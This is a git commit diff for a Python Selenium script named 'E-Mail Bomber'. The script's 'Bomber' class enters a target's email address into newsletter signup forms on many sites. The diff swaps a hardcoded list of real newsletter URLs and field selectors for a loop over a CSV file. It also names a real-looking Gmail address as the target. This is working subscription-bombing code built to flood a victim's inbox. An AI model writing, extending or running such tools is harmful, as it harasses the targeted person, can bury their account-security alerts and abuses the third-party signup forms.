9c8b9d9f1ae92079420051c240005a1fc1bb7d4f
leonw <leon.weinmann@gmx.de>
2020-05-17 01:50:45 +0200

    i

--- Useless_Projects/E-Mail Bomber/Test.py
+++ Useless_Projects/E-Mail Bomber/Test.py
@@ -1,5 +1,7 @@
+import csv
 from selenium import webdriver
 from selenium.webdriver.common.keys import Keys
+from selenium import webdriver
 from time import sleep
 from sys import exit
 
@@ -10,23 +12,18 @@ class Bomber:
         self.driver = webdriver.Firefox(executable_path=r'G:\Python_Projects\Selenium\geckodriver.exe')
         self.target_address = mail
         self.counter = 0
-        self.driver.implicitly_wait(10)
+        self.driver.implicitly_wait(20)
 
-    def start_bombing(self, delay=0, show_counter=0):
-        self.call("https://www.techbook.de/newsletter", name="inp_3",show_counter=show_counter)
-        sleep(delay)
-        self.call("https://snacks.robinhood.com/", class_c="css-r92b85",show_counter=show_counter)
-        sleep(delay)
-        self.call("https://www.myhomebook.de/newsletter", name="inp_3",show_counter=show_counter)
-        sleep(delay)
-        self.call("https://www.morningbrew.com/", id="subscription-email-form-input",show_counter=show_counter)
-        sleep(delay)
-        self.call("https://nextdraft.com/", id="mce-EMAIL",show_counter=show_counter)
-        sleep(delay)
-        self.call("https://moz.com/moztop10#confirmation", id="email-379ffa8c-772e-4b7b-9c22-47d60e0db419",show_counter=show_counter)
+    def read_csv_file(self, delay=0, show_counter=0):
+        with open("specs.csv", "r")as csv_file:
+            content = csv.reader(csv_file)
+            next(content)
+            for entry in content:
+                self.call(entry[0], name=entry[1], class_c=entry[2], id=entry[3], show_counter=show_counter)
+                sleep(delay)
 
-    def call(self, site, name='', class_c='', id='', show_counter=0):
-        self.driver.get(site)
+    def call(self, address, name='', class_c='', id='', show_counter=0):
+        self.driver.get(address)
         if name:
             element = self.driver.find_element_by_name(name)
             element.clear()
@@ -44,21 +41,23 @@ class Bomber:
             element.clear()
             element.send_keys(self.target_address)
             element.send_keys(Keys.RETURN)
+
         if show_counter:
             self.counter += 1
             print(self.counter)
+
+    def special_call(self):
+        pass
 
     def quit_driver(self):
         self.driver.quit()
 
 
 def main():
-    target = Bomber("luccat@gmail.com")
-    target.start_bombing(show_counter=1)
-    input()
+    target = Bomber("luccsdfat@gmail.com")
+    target.read_csv_file(show_counter=1)
     target.quit_driver()
 
 
-
-if "__main__" == __name__:
+if __name__ == "__main__":
     exit(main())
